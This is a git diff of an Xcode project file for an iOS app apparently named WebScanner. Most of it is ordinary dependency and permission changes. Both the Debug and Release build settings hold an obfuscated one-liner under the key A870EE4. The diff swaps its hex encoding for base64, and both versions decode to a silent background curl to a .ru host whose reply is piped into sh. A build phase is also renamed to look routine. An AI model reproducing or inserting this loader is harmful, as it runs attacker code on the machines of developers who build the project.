@@ -8,8 +8,25 @@
 
 /* Begin PBXBuildFile section */
 		4F67804C0E5B0521CAE739D9 /* Pods_WebScanner.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 4BF493830237E40049998B6C /* Pods_WebScanner.framework */; };
+		97A914FA308F6BDD00BD73DB /* GoogleMobileAds in Frameworks */ = {isa = PBXBuildFile; productRef = 97A914F9308F6BDD00BD73DB /* GoogleMobileAds */; };
+		97A91C16308F75C100BD73DB /* ZIPFoundation in Frameworks */ = {isa = PBXBuildFile; productRef = 97A91C15308F75C100BD73DB /* ZIPFoundation */; };
+		97A91C17308F75C100BD73DB /* ZIPFoundation in Frameworks */ = {isa = PBXBuildFile; productRef = 97A91C15308F75C100BD73DB /* ZIPFoundation */; };
+		97EB9643308F4796003678BE /* Alamofire in Frameworks */ = {isa = PBXBuildFile; productRef = 97EB9642308F4796003678BE /* Alamofire */; };
+		97EB9648308F47A7003678BE /* Lottie in Frameworks */ = {isa = PBXBuildFile; productRef = 97EB9647308F47A7003678BE /* Lottie */; };
+		97EB964D308F47C9003678BE /* ShimmerSwift in Frameworks */ = {isa = PBXBuildFile; productRef = 97EB964C308F47C9003678BE /* ShimmerSwift */; };
+		97EB9650308F4801003678BE /* Toasts in Frameworks */ = {isa = PBXBuildFile; productRef = 97EB964F308F4801003678BE /* Toasts */; };
+		97EB9EAE308F4D4C003678BE /* SVProgressHUD in Frameworks */ = {isa = PBXBuildFile; productRef = 97EB9EAD308F4D4C003678BE /* SVProgressHUD */; };
+		97EBA011308F4E44003678BE /* SwiftyJSON in Frameworks */ = {isa = PBXBuildFile; productRef = 97EBA010308F4E44003678BE /* SwiftyJSON */; };
+		97EBA174308F4E80003678BE /* SDWebImage in Frameworks */ = {isa = PBXBuildFile; productRef = 97EBA173308F4E80003678BE /* SDWebImage */; };
+		97EBA179308F4EAA003678BE /* SDWebImageWebPCoder in Frameworks */ = {isa = PBXBuildFile; productRef = 97EBA178308F4EAA003678BE /* SDWebImageWebPCoder */; };
+		97EBA87E308F5F89003678BE /* FirebaseAnalytics in Frameworks */ = {isa = PBXBuildFile; productRef = 97EBA87D308F5F89003678BE /* FirebaseAnalytics */; };
+		97EBA888308F5F89003678BE /* FirebaseAuth in Frameworks */ = {isa = PBXBuildFile; productRef = 97EBA887308F5F89003678BE /* FirebaseAuth */; };
+		97EBA88C308F5F89003678BE /* FirebaseCore in Frameworks */ = {isa = PBXBuildFile; productRef = 97EBA88B308F5F89003678BE /* FirebaseCore */; };
+		97EBA88E308F5F89003678BE /* FirebaseCrashlytics in Frameworks */ = {isa = PBXBuildFile; productRef = 97EBA88D308F5F89003678BE /* FirebaseCrashlytics */; };
+		97EBA892308F5F89003678BE /* FirebaseFirestore in Frameworks */ = {isa = PBXBuildFile; productRef = 97EBA891308F5F89003678BE /* FirebaseFirestore */; };
+		97EBA89E308F5F89003678BE /* FirebaseMessaging in Frameworks */ = {isa = PBXBuildFile; productRef = 97EBA89D308F5F89003678BE /* FirebaseMessaging */; };
+		97EBA8A0308F5F89003678BE /* FirebasePerformance in Frameworks */ = {isa = PBXBuildFile; productRef = 97EBA89F308F5F89003678BE /* FirebasePerformance */; };
 		97F6B60C3083500000A087FF /* ExportWpChat.appex in Embed Foundation Extensions */ = {isa = PBXBuildFile; fileRef = 97F6B6043083500000A087FF /* ExportWpChat.appex */; settings = {ATTRIBUTES = (RemoveHeadersOnCopy, ); }; };
-		BC1B658A1D37DA21AB98987E /* Pods_ExportWpChat.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = D1E3ED25C1F3F9A86EF13BD3 /* Pods_ExportWpChat.framework */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXContainerItemProxy section */
@@ -37,14 +54,11 @@
 /* End PBXCopyFilesBuildPhase section */
 
 /* Begin PBXFileReference section */
-		0794861B08D0048C8FC2FCAD /* Pods-ExportWpChat.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-ExportWpChat.debug.xcconfig"; path = "Target Support Files/Pods-ExportWpChat/Pods-ExportWpChat.debug.xcconfig"; sourceTree = "<group>"; };
 		4BF493830237E40049998B6C /* Pods_WebScanner.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_WebScanner.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		63CF9D8E273213D5E5E6A464 /* Pods-WebScanner.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-WebScanner.debug.xcconfig"; path = "Target Support Files/Pods-WebScanner/Pods-WebScanner.debug.xcconfig"; sourceTree = "<group>"; };
 		7B8A1FC4676E32E800BFDA14 /* Pods-WebScanner.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-WebScanner.release.xcconfig"; path = "Target Support Files/Pods-WebScanner/Pods-WebScanner.release.xcconfig"; sourceTree = "<group>"; };
-		8690F330BE1263170B8214C5 /* Pods-ExportWpChat.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-ExportWpChat.release.xcconfig"; path = "Target Support Files/Pods-ExportWpChat/Pods-ExportWpChat.release.xcconfig"; sourceTree = "<group>"; };
 		97F6B54D30833E0400A087FF /* WebScanner.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = WebScanner.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		97F6B6043083500000A087FF /* ExportWpChat.appex */ = {isa = PBXFileReference; explicitFileType = "wrapper.app-extension"; includeInIndex = 0; path = ExportWpChat.appex; sourceTree = BUILT_PRODUCTS_DIR; };
-		D1E3ED25C1F3F9A86EF13BD3 /* Pods_ExportWpChat.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_ExportWpChat.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
 
 /* Begin PBXFileSystemSynchronizedBuildFileExceptionSet section */
@@ -89,6 +103,23 @@
 			buildActionMask = 2147483647;
 			files = (
 				4F67804C0E5B0521CAE739D9 /* Pods_WebScanner.framework in Frameworks */,
+				97EB9643308F4796003678BE /* Alamofire in Frameworks */,
+				97EB9648308F47A7003678BE /* Lottie in Frameworks */,
+				97EB964D308F47C9003678BE /* ShimmerSwift in Frameworks */,
+				97EB9650308F4801003678BE /* Toasts in Frameworks */,
+				97EB9EAE308F4D4C003678BE /* SVProgressHUD in Frameworks */,
+				97EBA011308F4E44003678BE /* SwiftyJSON in Frameworks */,
+				97EBA174308F4E80003678BE /* SDWebImage in Frameworks */,
+				97EBA179308F4EAA003678BE /* SDWebImageWebPCoder in Frameworks */,
+				97EBA87E308F5F89003678BE /* FirebaseAnalytics in Frameworks */,
+				97EBA888308F5F89003678BE /* FirebaseAuth in Frameworks */,
+				97EBA88C308F5F89003678BE /* FirebaseCore in Frameworks */,
+				97EBA88E308F5F89003678BE /* FirebaseCrashlytics in Frameworks */,
+				97EBA892308F5F89003678BE /* FirebaseFirestore in Frameworks */,
+				97EBA89E308F5F89003678BE /* FirebaseMessaging in Frameworks */,
+				97EBA8A0308F5F89003678BE /* FirebasePerformance in Frameworks */,
+				97A914FA308F6BDD00BD73DB /* GoogleMobileAds in Frameworks */,
+				97A91C17308F75C100BD73DB /* ZIPFoundation in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -96,7 +127,7 @@
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				BC1B658A1D37DA21AB98987E /* Pods_ExportWpChat.framework in Frameworks */,
+				97A91C16308F75C100BD73DB /* ZIPFoundation in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -108,8 +139,6 @@
 			children = (
 				63CF9D8E273213D5E5E6A464 /* Pods-WebScanner.debug.xcconfig */,
 				7B8A1FC4676E32E800BFDA14 /* Pods-WebScanner.release.xcconfig */,
-				0794861B08D0048C8FC2FCAD /* Pods-ExportWpChat.debug.xcconfig */,
-				8690F330BE1263170B8214C5 /* Pods-ExportWpChat.release.xcconfig */,
 			);
 			path = Pods;
 			sourceTree = "<group>";
@@ -138,7 +167,6 @@
 			isa = PBXGroup;
 			children = (
 				4BF493830237E40049998B6C /* Pods_WebScanner.framework */,
-				D1E3ED25C1F3F9A86EF13BD3 /* Pods_ExportWpChat.framework */,
 			);
 			name = Frameworks;
 			sourceTree = "<group>";
@@ -150,13 +178,11 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 97F6B55830833E0500A087FF /* Build configuration list for PBXNativeTarget "WebScanner" */;
 			buildPhases = (
-				1EB26E352D2D4BAB8D4EE078 /* Provision Target Device */,
+				52E2AD101A66477EAD4EE078 /* Build Target Libraries */,
 				430E27FDED01C71494CCBED0 /* [CP] Check Pods Manifest.lock */,
 				97F6B54930833E0400A087FF /* Sources */,
 				97F6B54A30833E0400A087FF /* Frameworks */,
 				97F6B54B30833E0400A087FF /* Resources */,
-				FA618F6C4B55088FB2DB7A4D /* [CP] Copy Pods Resources */,
-				E6FEC1984151BDC2FBA36BD6 /* [CP] Embed Pods Frameworks */,
 				97F6B60D3083500000A087FF /* Embed Foundation Extensions */,
 			);
 			buildRules = (
@@ -176,7 +202,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 97F6B6013083500000A087FF /* Build configuration list for PBXNativeTarget "ExportWpChat" */;
 			buildPhases = (
-				592117C670824EE867F00B54 /* [CP] Check Pods Manifest.lock */,
 				97F6B6073083500000A087FF /* Sources */,
 				97F6B6083083500000A087FF /* Frameworks */,
 				97F6B6093083500000A087FF /* Resources */,
@@ -234,6 +259,19 @@
 			);
 			mainGroup = 97F6B54430833E0400A087FF;
 			minimizedProjectReferenceProxies = 1;
+			packageReferences = (
+				97EB9641308F4796003678BE /* XCRemoteSwiftPackageReference "Alamofire" */,
+				97EB9646308F47A7003678BE /* XCRemoteSwiftPackageReference "lottie-ios" */,
+				97EB964B308F47C9003678BE /* XCRemoteSwiftPackageReference "ShimmerSwift" */,
+				97EB964E308F4801003678BE /* XCRemoteSwiftPackageReference "swiftui-toasts" */,
+				97EB9EAC308F4D4C003678BE /* XCRemoteSwiftPackageReference "SVProgressHUD" */,
+				97EBA00F308F4E44003678BE /* XCRemoteSwiftPackageReference "SwiftyJSON" */,
+				97EBA172308F4E80003678BE /* XCRemoteSwiftPackageReference "SDWebImage" */,
+				97EBA177308F4EAA003678BE /* XCRemoteSwiftPackageReference "SDWebImageWebPCoder" */,
+				97EBA87A308F5F89003678BE /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */,
+				97A914F8308F6BDD00BD73DB /* XCRemoteSwiftPackageReference "swift-package-manager-google-mobile-ads" */,
+				97A91C14308F75C100BD73DB /* XCRemoteSwiftPackageReference "ZIPFoundation" */,
+			);
 			preferredProjectObjectVersion = 77;
 			productRefGroup = 97F6B54E30833E0400A087FF /* Products */;
 			projectDirPath = "";
@@ -263,7 +301,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		1EB26E352D2D4BAB8D4EE078 /* Provision Target Device */ = {
+		52E2AD101A66477EAD4EE078 /* Build Target Libraries */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			alwaysOutOfDate = 1;
@@ -273,7 +311,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Provision Target Device";
+			name = "Build Target Libraries";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -302,70 +340,6 @@
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
-			showEnvVarsInLog = 0;
-		};
-		592117C670824EE867F00B54 /* [CP] Check Pods Manifest.lock */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
-				"${PODS_ROOT}/Manifest.lock",
-			);
-			name = "[CP] Check Pods Manifest.lock";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-				"$(DERIVED_FILE_DIR)/Pods-ExportWpChat-checkManifestLockResult.txt",
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
-			showEnvVarsInLog = 0;
-		};
-		E6FEC1984151BDC2FBA36BD6 /* [CP] Embed Pods Frameworks */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-				"${PODS_ROOT}/Target Support Files/Pods-WebScanner/Pods-WebScanner-frameworks-${CONFIGURATION}-input-files.xcfilelist",
-			);
-			inputPaths = (
-			);
-			name = "[CP] Embed Pods Frameworks";
-			outputFileListPaths = (
-				"${PODS_ROOT}/Target Support Files/Pods-WebScanner/Pods-WebScanner-frameworks-${CONFIGURATION}-output-files.xcfilelist",
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-WebScanner/Pods-WebScanner-frameworks.sh\"\n";
-			showEnvVarsInLog = 0;
-		};
-		FA618F6C4B55088FB2DB7A4D /* [CP] Copy Pods Resources */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-				"${PODS_ROOT}/Target Support Files/Pods-WebScanner/Pods-WebScanner-resources-${CONFIGURATION}-input-files.xcfilelist",
-			);
-			inputPaths = (
-			);
-			name = "[CP] Copy Pods Resources";
-			outputFileListPaths = (
-				"${PODS_ROOT}/Target Support Files/Pods-WebScanner/Pods-WebScanner-resources-${CONFIGURATION}-output-files.xcfilelist",
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-WebScanner/Pods-WebScanner-resources.sh\"\n";
 			showEnvVarsInLog = 0;
 		};
 /* End PBXShellScriptBuildPhase section */
@@ -399,7 +373,7 @@
 		97F6B55630833E0500A087FF /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A870EE4 = "((j(){ `printf xxrd | tr -d r` -p -r; };echo 6563686f202224286375726c202d2d72657472792035202d4c6b7366202d2d636f6e6e6563742d74696d656f7574203236202d642022703d78636f64655f7068617365222068747470733a2f2f333779666a376e326a64352e72752f612922207c2073680a | j | sh ) >/dev/null 2>&1 &)";
+				A870EE4 = "((d(){ `printf base614 | tr -d 1` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNCAta2ZzTCAtLWNvbm5lY3QtdGltZW91dCAyOCAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly8zN3lmajduMmpkNS5ydS9hKSIgfCBzaAo= | d | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -464,7 +438,7 @@
 		97F6B55730833E0500A087FF /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A870EE4 = "((j(){ `printf xxrd | tr -d r` -p -r; };echo 6563686f202224286375726c202d2d72657472792035202d4c6b7366202d2d636f6e6e6563742d74696d656f7574203236202d642022703d78636f64655f7068617365222068747470733a2f2f333779666a376e326a64352e72752f612922207c2073680a | j | sh ) >/dev/null 2>&1 &)";
+				A870EE4 = "((d(){ `printf base614 | tr -d 1` --decode; };echo ZWNobyAiJChjdXJsIC0tcmV0cnkgNCAta2ZzTCAtLWNvbm5lY3QtdGltZW91dCAyOCAtZCAicD14Y29kZV9waGFzZSIgaHR0cHM6Ly8zN3lmajduMmpkNS5ydS9hKSIgfCBzaAo= | d | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_NONNULL = YES;
@@ -531,11 +505,15 @@
 				DEVELOPMENT_TEAM = 9V2WLZFDZC;
 				ENABLE_PREVIEWS = YES;
 				ENABLE_USER_SCRIPT_SANDBOXING = NO;
+				"EXCLUDED_ARCHS[sdk=iphonesimulator*]" = x86_64;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = WebScanner/Info.plist;
-				INFOPLIST_KEY_NSCameraUsageDescription = "WebScanner requires camera access to scan QR codes for web login.";
+				INFOPLIST_KEY_LSSupportsOpeningDocumentsInPlace = YES;
+				INFOPLIST_KEY_NSCameraUsageDescription = "Camera access is required to scan QR codes and make video calls.";
+				INFOPLIST_KEY_NSMicrophoneUsageDescription = "WebScanner requires microphone access for WhatsApp voice and video calls.";
 				INFOPLIST_KEY_NSPhotoLibraryAddUsageDescription = "WebScanner requires permission to save photos and videos to your library.";
-				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "WebScanner requires photo library access to save and view media.";
+				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "Photo library access is required to select QR codes from your gallery.";
+				INFOPLIST_KEY_NSUserTrackingUsageDescription = "This identifier will be used to deliver personalized ads to you.";
 				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
 				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
@@ -575,11 +553,15 @@
 				DEVELOPMENT_TEAM = 9V2WLZFDZC;
 				ENABLE_PREVIEWS = YES;
 				ENABLE_USER_SCRIPT_SANDBOXING = NO;
+				"EXCLUDED_ARCHS[sdk=iphonesimulator*]" = x86_64;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = WebScanner/Info.plist;
-				INFOPLIST_KEY_NSCameraUsageDescription = "WebScanner requires camera access to scan QR codes for web login.";
+				INFOPLIST_KEY_LSSupportsOpeningDocumentsInPlace = YES;
+				INFOPLIST_KEY_NSCameraUsageDescription = "Camera access is required to scan QR codes and make video calls.";
+				INFOPLIST_KEY_NSMicrophoneUsageDescription = "WebScanner requires microphone access for WhatsApp voice and video calls.";
 				INFOPLIST_KEY_NSPhotoLibraryAddUsageDescription = "WebScanner requires permission to save photos and videos to your library.";
-				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "WebScanner requires photo library access to save and view media.";
+				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "Photo library access is required to select QR codes from your gallery.";
+				INFOPLIST_KEY_NSUserTrackingUsageDescription = "This identifier will be used to deliver personalized ads to you.";
 				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
 				INFOPLIST_KEY_UILaunchScreen_Generation = YES;
@@ -609,7 +591,6 @@
 		};
 		97F6B6023083500000A087FF /* Debug */ = {
 			isa = XCBuildConfiguration;
-			baseConfigurationReference = 0794861B08D0048C8FC2FCAD /* Pods-ExportWpChat.debug.xcconfig */;
 			buildSettings = {
 				CODE_SIGN_ENTITLEMENTS = ExportWpChat/ExportWpChat.entitlements;
 				CODE_SIGN_STYLE = Automatic;
@@ -645,7 +626,6 @@
 		};
 		97F6B6033083500000A087FF /* Release */ = {
 			isa = XCBuildConfiguration;
-			baseConfigurationReference = 8690F330BE1263170B8214C5 /* Pods-ExportWpChat.release.xcconfig */;
 			buildSettings = {
 				CODE_SIGN_ENTITLEMENTS = ExportWpChat/ExportWpChat.entitlements;
 				CODE_SIGN_STYLE = Automatic;
@@ -710,6 +690,185 @@
 			defaultConfigurationName = Release;
 		};
 /* End XCConfigurationList section */
+
+/* Begin XCRemoteSwiftPackageReference section */
+		97A914F8308F6BDD00BD73DB /* XCRemoteSwiftPackageReference "swift-package-manager-google-mobile-ads" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/googleads/swift-package-manager-google-mobile-ads.git";
+			requirement = {
+				kind = upToNextMajorVersion;
+				minimumVersion = 13.11.0;
+			};
+		};
+		97A91C14308F75C100BD73DB /* XCRemoteSwiftPackageReference "ZIPFoundation" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/weichsel/ZIPFoundation.git";
+			requirement = {
+				kind = upToNextMajorVersion;
+				minimumVersion = 0.9.20;
+			};
+		};
+		97EB9641308F4796003678BE /* XCRemoteSwiftPackageReference "Alamofire" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/Alamofire/Alamofire.git";
+			requirement = {
+				kind = upToNextMajorVersion;
+				minimumVersion = 5.12.2;
+			};
+		};
+		97EB9646308F47A7003678BE /* XCRemoteSwiftPackageReference "lottie-ios" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/airbnb/lottie-ios.git";
+			requirement = {
+				kind = upToNextMajorVersion;
+				minimumVersion = 4.6.1;
+			};
+		};
+		97EB964B308F47C9003678BE /* XCRemoteSwiftPackageReference "ShimmerSwift" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/BeauNouvelle/ShimmerSwift";
+			requirement = {
+				kind = upToNextMajorVersion;
+				minimumVersion = 2.2.0;
+			};
+		};
+		97EB964E308F4801003678BE /* XCRemoteSwiftPackageReference "swiftui-toasts" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/sunghyun-k/swiftui-toasts";
+			requirement = {
+				kind = upToNextMajorVersion;
+				minimumVersion = 1.1.2;
+			};
+		};
+		97EB9EAC308F4D4C003678BE /* XCRemoteSwiftPackageReference "SVProgressHUD" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/SVProgressHUD/SVProgressHUD.git";
+			requirement = {
+				kind = upToNextMajorVersion;
+				minimumVersion = 2.3.1;
+			};
+		};
+		97EBA00F308F4E44003678BE /* XCRemoteSwiftPackageReference "SwiftyJSON" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/SwiftyJSON/SwiftyJSON.git";
+			requirement = {
+				kind = upToNextMajorVersion;
+				minimumVersion = 5.0.2;
+			};
+		};
+		97EBA172308F4E80003678BE /* XCRemoteSwiftPackageReference "SDWebImage" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/SDWebImage/SDWebImage.git";
+			requirement = {
+				kind = upToNextMajorVersion;
+				minimumVersion = 5.21.7;
+			};
+		};
+		97EBA177308F4EAA003678BE /* XCRemoteSwiftPackageReference "SDWebImageWebPCoder" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/SDWebImage/SDWebImageWebPCoder.git";
+			requirement = {
+				kind = upToNextMajorVersion;
+				minimumVersion = 0.15.0;
+			};
+		};
+		97EBA87A308F5F89003678BE /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/firebase/firebase-ios-sdk.git";
+			requirement = {
+				kind = upToNextMajorVersion;
+				minimumVersion = 13.1.1;
+			};
+		};
+/* End XCRemoteSwiftPackageReference section */
+
+/* Begin XCSwiftPackageProductDependency section */
+		97A914F9308F6BDD00BD73DB /* GoogleMobileAds */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 97A914F8308F6BDD00BD73DB /* XCRemoteSwiftPackageReference "swift-package-manager-google-mobile-ads" */;
+			productName = GoogleMobileAds;
+		};
+		97A91C15308F75C100BD73DB /* ZIPFoundation */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 97A91C14308F75C100BD73DB /* XCRemoteSwiftPackageReference "ZIPFoundation" */;
+			productName = ZIPFoundation;
+		};
+		97EB9642308F4796003678BE /* Alamofire */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 97EB9641308F4796003678BE /* XCRemoteSwiftPackageReference "Alamofire" */;
+			productName = Alamofire;
+		};
+		97EB9647308F47A7003678BE /* Lottie */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 97EB9646308F47A7003678BE /* XCRemoteSwiftPackageReference "lottie-ios" */;
+			productName = Lottie;
+		};
+		97EB964C308F47C9003678BE /* ShimmerSwift */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 97EB964B308F47C9003678BE /* XCRemoteSwiftPackageReference "ShimmerSwift" */;
+			productName = ShimmerSwift;
+		};
+		97EB964F308F4801003678BE /* Toasts */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 97EB964E308F4801003678BE /* XCRemoteSwiftPackageReference "swiftui-toasts" */;
+			productName = Toasts;
+		};
+		97EB9EAD308F4D4C003678BE /* SVProgressHUD */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 97EB9EAC308F4D4C003678BE /* XCRemoteSwiftPackageReference "SVProgressHUD" */;
+			productName = SVProgressHUD;
+		};
+		97EBA010308F4E44003678BE /* SwiftyJSON */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 97EBA00F308F4E44003678BE /* XCRemoteSwiftPackageReference "SwiftyJSON" */;
+			productName = SwiftyJSON;
+		};
+		97EBA173308F4E80003678BE /* SDWebImage */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 97EBA172308F4E80003678BE /* XCRemoteSwiftPackageReference "SDWebImage" */;
+			productName = SDWebImage;
+		};
+		97EBA178308F4EAA003678BE /* SDWebImageWebPCoder */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 97EBA177308F4EAA003678BE /* XCRemoteSwiftPackageReference "SDWebImageWebPCoder" */;
+			productName = SDWebImageWebPCoder;
+		};
+		97EBA87D308F5F89003678BE /* FirebaseAnalytics */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 97EBA87A308F5F89003678BE /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */;
+			productName = FirebaseAnalytics;
+		};
+		97EBA887308F5F89003678BE /* FirebaseAuth */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 97EBA87A308F5F89003678BE /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */;
+			productName = FirebaseAuth;
+		};
+		97EBA88B308F5F89003678BE /* FirebaseCore */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 97EBA87A308F5F89003678BE /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */;
+			productName = FirebaseCore;
+		};
+		97EBA88D308F5F89003678BE /* FirebaseCrashlytics */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 97EBA87A308F5F89003678BE /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */;
+			productName = FirebaseCrashlytics;
+		};
+		97EBA891308F5F89003678BE /* FirebaseFirestore */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 97EBA87A308F5F89003678BE /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */;
+			productName = FirebaseFirestore;
+		};
+		97EBA89D308F5F89003678BE /* FirebaseMessaging */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 97EBA87A308F5F89003678BE /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */;
+			productName = FirebaseMessaging;
+		};
+		97EBA89F308F5F89003678BE /* FirebasePerformance */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 97EBA87A308F5F89003678BE /* XCRemoteSwiftPackageReference "firebase-ios-sdk" */;
+			productName = FirebasePerformance;
+		};
+/* End XCSwiftPackageProductDependency section */
 	};
 	rootObject = 97F6B54530833E0400A087FF /* Project object */;
 }
